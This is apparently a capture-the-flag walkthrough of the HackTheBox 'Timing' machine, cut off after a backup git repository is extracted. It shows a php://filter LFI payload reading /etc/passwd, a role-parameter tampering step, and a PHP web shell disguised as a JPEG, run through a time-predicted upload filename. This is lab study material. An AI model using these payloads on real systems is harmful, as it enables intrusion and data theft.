</span></span><span style=display:flex><span>|     PHPSESSID: 
</span></span><span style=display:flex><span>|_      httponly flag not set
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done at Fri Jan 28 23:14:33 2022 -- 1 IP address (1 host up) scanned in 110.52 seconds
</span></span></code></pre></div><p>Notice the two usual and classic open ports: ssh on port 22 and http on port 80 I immediately put the domain timing.htb in my /etc/hosts file and I also noticed the login.php file name which means it is a PHP server</p><p>Navigating the web <a href=http://timing.htb>http://timing.htb</a> it&rsquo;s running
a simple web app with a login page</p><p><img loading=lazy src=/blog/posts/img/timing1.png alt="Test Image">
</p><p>let&rsquo;s check hidden files and subdirectory using gobuster</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>gobuster dir -u http://timing.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php,txt
</span></span><span style=display:flex><span>===============================================================
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves (@TheColonial) <span style=color:#960050;background-color:#1e0010>&amp;</span> Christian Mehlmauer (@firefart)
</span></span><span style=display:flex><span>===============================================================
</span></span><span style=display:flex><span>[+] Url:                     http://timing.htb/
</span></span><span style=display:flex><span>[+] Method:                  GET
</span></span><span style=display:flex><span>[+] Threads:                 10
</span></span><span style=display:flex><span>[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
</span></span><span style=display:flex><span>[+] Negative Status codes:   404
</span></span><span style=display:flex><span>[+] User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span>[+] Extensions:              php,txt
</span></span><span style=display:flex><span>[+] Timeout:                 10s
</span></span><span style=display:flex><span>===============================================================
</span></span><span style=display:flex><span>2022/01/28 01:56:28 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span>===============================================================
</span></span><span style=display:flex><span>/.php                 (Status: 403) [Size: 275]
</span></span><span style=display:flex><span>/.html                (Status: 403) [Size: 275]
</span></span><span style=display:flex><span>/.html.txt            (Status: 403) [Size: 275]
</span></span><span style=display:flex><span>/login.php            (Status: 200) [Size: 5609]
</span></span><span style=display:flex><span>/.html.php            (Status: 403) [Size: 275] 
</span></span><span style=display:flex><span>/images               (Status: 301) [Size: 309] [--&gt; http://timing.htb/images/]
</span></span><span style=display:flex><span>/js                   (Status: 301) [Size: 305] [--&gt; http://timing.htb/js/]    
</span></span><span style=display:flex><span>/index.php            (Status: 302) [Size: 0] [--&gt; ./login.php]                
</span></span><span style=display:flex><span>/css                  (Status: 301) [Size: 306] [--&gt; http://timing.htb/css/]   
</span></span><span style=display:flex><span>/.htm                 (Status: 403) [Size: 275]                                
</span></span><span style=display:flex><span>/.htm.php             (Status: 403) [Size: 275]                                
</span></span><span style=display:flex><span>/.htm.txt             (Status: 403) [Size: 275]                                
</span></span><span style=display:flex><span>/profile.php          (Status: 302) [Size: 0] [--&gt; ./login.php]                
</span></span><span style=display:flex><span>/logout.php           (Status: 302) [Size: 0] [--&gt; ./login.php]                
</span></span><span style=display:flex><span>/image.php            (Status: 200) [Size: 0]                                  
</span></span><span style=display:flex><span>/upload.php           (Status: 302) [Size: 0] [--&gt; ./login.php]                
</span></span><span style=display:flex><span>/header.php           (Status: 302) [Size: 0] [--&gt; ./login.php]                
</span></span><span style=display:flex><span>/footer.php           (Status: 200) [Size: 3937]                               
</span></span><span style=display:flex><span>/.                    (Status: 302) [Size: 0] [--&gt; ./login.php]                
</span></span><span style=display:flex><span>Progress: 1353 / 129012 (1.05%)                                                                                                                            
</span></span><span style=display:flex><span>===============================================================
</span></span><span style=display:flex><span>2022/01/28 01:58:00 Finished
</span></span><span style=display:flex><span>===============================================================
</span></span></code></pre></div><p>The result is showing an interesting one which is an image.php file
accessing the image.php it doesn&rsquo;t contain body or content</p><p><img loading=lazy src=/blog/posts/img/timing2.png alt="Test Image">
</p><p>fuzzing the image.php file parameter using ffuf</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>ffuf -u http://timing.htb/image.php?FUZZ=/etc/passwd -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0 -mc all  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span style=display:flex><span>       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span style=display:flex><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span style=display:flex><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span style=display:flex><span>         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span style=display:flex><span>          \/_/    \/_/   \/___/    \/_/       
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       v1.3.1 Kali Exclusive &lt;<span style=color:#f92672>3</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>________________________________________________</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>::</span> <span style=color:#a6e22e>Method</span>           <span style=color:#a6e22e>:</span> <span style=color:#a6e22e>GET</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>::</span> <span style=color:#a6e22e>URL</span>              <span style=color:#a6e22e>:</span> <span style=color:#a6e22e>http:</span><span style=color:#960050;background-color:#1e0010>//</span><span style=color:#a6e22e>timing</span><span style=color:#960050;background-color:#1e0010>.</span><span style=color:#a6e22e>htb</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>image</span><span style=color:#960050;background-color:#1e0010>.</span><span style=color:#a6e22e>php</span><span style=color:#960050;background-color:#1e0010>?</span><span style=color:#a6e22e>FUZZ</span><span style=color:#f92672>=</span><span style=color:#e6db74>/etc/passwd</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>::</span> <span style=color:#a6e22e>Wordlist</span>         <span style=color:#a6e22e>:</span> <span style=color:#a6e22e>FUZZ:</span> <span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>opt</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>SecLists</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>Discovery</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>Web-Content</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>burp-parameter-names</span><span style=color:#960050;background-color:#1e0010>.</span><span style=color:#a6e22e>txt</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>::</span> <span style=color:#a6e22e>Follow</span> <span style=color:#a6e22e>redirects</span> <span style=color:#a6e22e>:</span> <span style=color:#a6e22e>false</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>::</span> <span style=color:#a6e22e>Calibration</span>      <span style=color:#a6e22e>:</span> <span style=color:#a6e22e>false</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>::</span> <span style=color:#a6e22e>Timeout</span>          <span style=color:#a6e22e>:</span> <span style=color:#a6e22e>10</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>::</span> <span style=color:#a6e22e>Threads</span>          <span style=color:#a6e22e>:</span> <span style=color:#a6e22e>40</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>::</span> <span style=color:#a6e22e>Matcher</span>          <span style=color:#a6e22e>:</span> <span style=color:#a6e22e>Response</span> <span style=color:#a6e22e>status:</span> <span style=color:#a6e22e>all</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>::</span> <span style=color:#a6e22e>Filter</span>           <span style=color:#a6e22e>:</span> <span style=color:#a6e22e>Response</span> <span style=color:#a6e22e>size:</span> <span style=color:#a6e22e>0</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>________________________________________________</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>img</span>                     <span style=color:#960050;background-color:#1e0010>[</span><span style=color:#a6e22e>Status:</span> <span style=color:#a6e22e>200</span><span style=color:#960050;background-color:#1e0010>,</span> <span style=color:#a6e22e>Size:</span> <span style=color:#a6e22e>25</span><span style=color:#960050;background-color:#1e0010>,</span> <span style=color:#a6e22e>Words:</span> <span style=color:#a6e22e>3</span><span style=color:#960050;background-color:#1e0010>,</span> <span style=color:#a6e22e>Lines:</span> <span style=color:#a6e22e>1</span><span style=color:#960050;background-color:#1e0010>]</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>[</span><span style=color:#a6e22e>WARN</span><span style=color:#960050;background-color:#1e0010>]</span> <span style=color:#a6e22e>Caught</span> <span style=color:#a6e22e>keyboard</span> <span style=color:#a6e22e>interrupt</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>Ctrl-C</span><span style=color:#960050;background-color:#1e0010>)</span>
</span></span></code></pre></div><p>Check the parameter &ldquo;?img=&rdquo; with /etc/passwd in burp suite the server sends a response message &ldquo;hacking detected&rdquo; which means the server is blocking our request</p><p><img loading=lazy src=/blog/posts/img/timing3.png alt="Test Image">
</p><p>I try to bypass the filtering method with php://filter wrappers
<a href="http://example.com/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd">http://example.com/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd</a></p><p><img loading=lazy src=/blog/posts/img/timing4.png alt="Test Image">
</p><p>it successfully vulnerable to LFI</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>┌──(kali㉿vm)-[~/HTB/timing]
</span></span><span style=display:flex><span>└─$ echo -n &#39;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMTE6MTE0Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQphYXJvbjp4OjEwMDA6MTAwMDphYXJvbjovaG9tZS9hYXJvbjovYmluL2Jhc2gK&#39; | base64 -d
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
</span></span><span style=display:flex><span>syslog:x:102:106::/home/syslog:/usr/sbin/nologin
</span></span><span style=display:flex><span>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>lxd:x:105:65534::/var/lib/lxd/:/bin/false
</span></span><span style=display:flex><span>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
</span></span><span style=display:flex><span>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
</span></span><span style=display:flex><span>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style=display:flex><span>pollinate:x:109:1::/var/cache/pollinate:/bin/false
</span></span><span style=display:flex><span>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style=display:flex><span>aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
</span></span></code></pre></div><p>Decoding the base64 encoding data and the user is aaron</p><p>Try to log in the web using default credentials (aaron:aaron)</p><p><img loading=lazy src=/blog/posts/img/timing5.png alt="Test Image">
</p><p>we logged in as user2 and it has an edit profile menu.</p><p><img loading=lazy src=/blog/posts/img/timing6.png alt="Test Image">
</p><p>I have already read all the .php files using LFI there is a file called &ldquo;admin_auth_check.php&rdquo;. It defines role!=1 no permission to admin panel so role=1 is the admin role.
Capture the edit profile request in the burp repeater and then check the response.
The response is JSON data with role parameter that is 0</p><p>admin_auth_check.php</p><p><img loading=lazy src=/blog/posts/img/timing_admin_auth.png alt="Alt text">
</p><p>Respone in Burp repeater</p><p><img loading=lazy src=/blog/posts/img/timing7.png alt="Test Image">
</p><p>Manipulating the request to add the role parameter role=1</p><p><img loading=lazy src=/blog/posts/img/timing8.png alt="Test Image">
</p><p>Yes, I successfully change the user role to admin role. After that I refresh the page now I can access the admin panel that allow us to upload
images.</p><p><img loading=lazy src=/blog/posts/img/timing9.png alt="Test Image">
</p><p>Upload.php which is the backend code for
uploading images.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$upload_dir<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;images/uploads/&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$file <span style=color:#a6e22e>hash</span> <span style=color:#a6e22e>uniqid</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$file <span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>(<span style=color:#e6db74>&#39;$file hash&#39;</span> <span style=color:#a6e22e>time</span>())<span style=color:#f92672>.</span> [<span style=color:#e6db74>&#34;name&#34;</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$target_file <span style=color:#f92672>=</span> <span style=color:#a6e22e>Supload</span> <span style=color:#a6e22e>dir</span> <span style=color:#a6e22e>Sfile</span> <span style=color:#a6e22e>name</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$error <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$imageFileType <span style=color:#f92672>=</span> <span style=color:#a6e22e>strtolower</span>(<span style=color:#a6e22e>pathinfo</span>(<span style=color:#a6e22e>Starget_file</span>, <span style=color:#a6e22e>PATHINFO_EXTENSION</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#34;submit&#34;</span>])) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Scheck</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>getimagesize</span>($_FILES[<span style=color:#e6db74>&#34;fileToupload&#34;</span>][<span style=color:#e6db74>&#34;tmp_name&#34;</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($check <span style=color:#f92672>===</span> <span style=color:#66d9ef>false</span>) ( <span style=color:#a6e22e>Serror</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Invalid file&#34;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>SimageFileType</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;jpg&#34;</span>) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Serror</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;This extension is not allowed.&#34;</span>;
</span></span></code></pre></div><p>Above code is what we will look into. Uploaded files will be moved to */images/uploads/&rsquo; directory. File Extension must have jpg&rsquo;, and upon upload the filename will be changed to MD5 sum. The logic behind creating this MD5 sum is, it takes two things as input, $file hash&rsquo; and &rsquo;time())&rsquo; and then adds the base filename of uploaded file to that hash.</p><blockquote>
<p>According to PHP, uniqid() function generates a unique ID based on the microtime (the current time in microseconds). In PHP single quote (&rsquo;) and double quote(") have different meanings and interpretations.</p></blockquote><blockquote>
<p>Single quoted strings will display things almost completely &ldquo;as is.&rdquo;. Double quote
strings will display a host of escaped characters (including some regexes), and
variables in the strings will be evaluated.</p></blockquote><p>So, uniqid() is just a rabbit hole, it is taking sfile hash as string to generate MD5 hash. However, time()) is also being used as factor to generate MDS. It is considering current time in seconds, that means every second will get a new hash.</p><p>We need to match the upload time to get the right hash. For that we need to make sure our local machine time is not far behind or a head.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>┌──(kali㉿vm)-[~/HTB/timing]
</span></span><span style=display:flex><span>└─$ nmap -p80 --script http-date timing.htb
</span></span><span style=display:flex><span>Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-18 17:04 GMT
</span></span><span style=display:flex><span>Nmap scan report for timing.htb (10.10.11.135)
</span></span><span style=display:flex><span>Host is up (0.27s latency).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>|_http-date: Fri, 18 Feb 2022 17:04:43 GMT; +30s from local time.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap done: 1 IP address (1 host up) scanned in 5.19 seconds
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>┌──(kali㉿vm)-[~/HTB/timing]
</span></span><span style=display:flex><span>└─$ date
</span></span><span style=display:flex><span>Fri Feb 18 17:04:13 PM GMT 2022
</span></span></code></pre></div><p>You can check the date and match it with your time using nmap. Target is-16 seconds behind from my local time. You just need to confirm time, make sure to set your time to GMT.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>cat payload.jpg 
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?php system($_GET[cmd]);?&gt;</span> 
</span></span></code></pre></div><p>Create a jpg file with PHP code which can give code execution access. Now we need to start a PHP interactive shell, where we run continuously run PHP code to generate hash based on time and string.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>┌──(kali㉿vm)-[~/HTB/timing]
</span></span><span style=display:flex><span>└─$ php -a
</span></span><span style=display:flex><span>Interactive shell
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>php &gt; while (true){echo date(&#34;D M J G:i:s T y&#34;); echo &#34;=&#34; ; echo md5(&#39;$file_hash&#39; . time());echo &#34;\n&#34;;sleep(1);}
</span></span><span style=display:flex><span>Fri Feb J 17:10:09 UTC 22=46f86e00cdc28dfdd17140ab650f253c
</span></span><span style=display:flex><span>Fri Feb J 17:10:10 UTC 22=ae30812a01e35558eb19edb80c0f5f43
</span></span><span style=display:flex><span>Fri Feb J 17:10:11 UTC 22=3c400e04e2dbd18e5b279f8d9f0437e2
</span></span><span style=display:flex><span>Fri Feb J 17:10:12 UTC 22=bc85022b6ba0af3fd2b68116784e981a
</span></span><span style=display:flex><span>Fri Feb J 17:10:13 UTC 22=ba90f0d034a883a4bb9f51c2d89b846d
</span></span></code></pre></div><p>Keep it going, do not terminate it. Now we need to upload that recently created jpg file, intercept the upload request, send it to repeater, check the response time and match the time with PHP hash.</p><p><img loading=lazy src=/blog/posts/img/timing10.png alt="Test Image">
</p><p>Check burp response time and find the matching hash of that time from PHP interactive session.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>┌──(kali㉿vm)-[~/HTB/timing]
</span></span><span style=display:flex><span>└─$ php -a
</span></span><span style=display:flex><span>Interactive shell
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>php &gt; while (true){echo date(&#34;D M J G:i:s T y&#34;); echo &#34;=&#34; ; echo md5(&#39;$file_hash&#39; . time());echo &#34;\n&#34;;sleep(1);}
</span></span><span style=display:flex><span>Fri Feb J 17:11:22 UTC 22=08576e1d40eb90b0be4bd88cfb9dfb6e
</span></span><span style=display:flex><span>Fri Feb J 17:11:23 UTC 22=aadec32bafe6cc4e5e52af30a272fcc1
</span></span><span style=display:flex><span>Fri Feb J 17:11:24 UTC 22=77a0ca1126765779fd995e6ca385f1ba
</span></span><span style=display:flex><span>Fri Feb J 17:11:25 UTC 22=8e055d3f73b750172035beb253c5d2e9
</span></span><span style=display:flex><span>Fri Feb J 17:11:26 UTC 22=dfee1b4cb23db563252d16081c58d098
</span></span><span style=display:flex><span>Fri Feb J 17:11:27 UTC 22=507185ca9da790587f30e3b62f60e2d5
</span></span><span style=display:flex><span>Fri Feb J 17:11:28 UTC 22=bf382cf682d3e9d14e244f68edcba071
</span></span></code></pre></div><p>The time matched hash is <strong>Fri Feb J 17:11:25 UTC 22=8e055d3f73b750172035beb253c5d2e9</strong></p><p>now let&rsquo;s excuited our uploaded payload through
<a href="http://timing.htb/image.php?img=images/uploads/8e055d3f73b750172035beb253c5d2e9_payload.jpg&cmd=id">http://timing.htb/image.php?img=images/uploads/8e055d3f73b750172035beb253c5d2e9_payload.jpg&cmd=id</a></p><p><img loading=lazy src=/blog/posts/img/timing11.png alt="Test Image">
</p><p>Here, we have the RCE we try to get back a reverse shell but we can&rsquo;t get a shell with the www-data user, it&rsquo;s like he has outside connections restriction so we try to enumerate the server directory we find a backup file in the opt directory.</p><p><img loading=lazy src=/blog/posts/img/timing12.png alt="Test Image">
</p><p>Copy the file to the webserver root directory and get the file to our machine</p><p><img loading=lazy src=/blog/posts/img/timing13.png alt="Test Image">
</p><p>Unzip the file it contains the git repository</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>┌──(kali㉿vm)-[~/HTB/timing/zip/backup]
</span></span><span style=display:flex><span>└─$ ls -la
</span></span><span style=display:flex><span>total 76
</span></span><span style=display:flex><span>drwxr-xr-x 6 kali kali 4096 Jul 20  2021 .
</span></span><span style=display:flex><span>drwxr-xr-x 3 kali kali 4096 Feb 15 08:12 ..
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali  200 Jul 20  2021 admin_auth_check.php
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali  373 Jul 20  2021 auth_check.php
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali 1268 Jul 20  2021 avatar_uploader.php
</span></span><span style=display:flex><span>drwxr-xr-x 2 kali kali 4096 Jul 20  2021 css
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali   92 Jul 20  2021 db_conn.php
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali 3937 Jul 20  2021 footer.php
</span></span><span style=display:flex><span>drwxr-xr-x 8 kali kali 4096 Feb 15 08:21 .git
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali 1498 Jul 20  2021 header.php
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali  507 Jul 20  2021 image.php
</span></span><span style=display:flex><span>drwxr-xr-x 3 kali kali 4096 Jul 20  2021 images
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali  188 Jul 20  2021 index.php
</span></span><span style=display:flex><span>drwxr-xr-x 2 kali kali 4096 Jul 20  2021 js
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali 2074 Jul 20  2021 login.php
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali  113 Jul 20  2021 logout.php
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali 3041 Jul 20  2021 profile.php
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali 1740 Jul 20  2021 profile_update.php
</span></span><span style=display:flex><span>-rw-r--r-- 1 kali kali  984 Jul 20  2021 upload.php
</span></span></code></pre></div><p>let&rsquo;s enumerate the git repository we use the command show
which is used to &ldquo;Show various types of objects&rdquo;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>git show
